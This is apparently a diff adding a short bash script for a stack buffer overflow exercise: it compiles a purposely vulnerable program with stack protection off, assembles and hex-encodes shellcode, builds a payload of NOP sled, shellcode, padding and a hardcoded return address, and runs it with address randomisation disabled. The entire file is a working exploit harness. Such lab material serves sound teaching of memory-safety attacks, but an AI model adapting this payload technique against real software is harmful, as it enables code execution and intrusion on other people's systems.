@@ -1,0 +1,19 @@
+#!/bin/bash
+
+set -e
+
+# build vuln
+gcc -g -fno-stack-protector -o vuln vuln.c
+
+# build shellcode
+nasm -f elf shellcode.asm
+
+# extract shellcode
+objcopy -j .text -O binary shellcode.o shellcode
+SHELLCODE=$(hexdump -v -e '/1 " %02X"' shellcode | sed 's/ /\\x/g')
+
+# craft payload
+PAYLOAD=$(python -c "print '\x90'*40 + '$SHELLCODE' + 'A'*47 + '\xd0\xf4\xff\xbf'")
+
+# run
+setarch $(arch) -R ./vuln "$PAYLOAD"
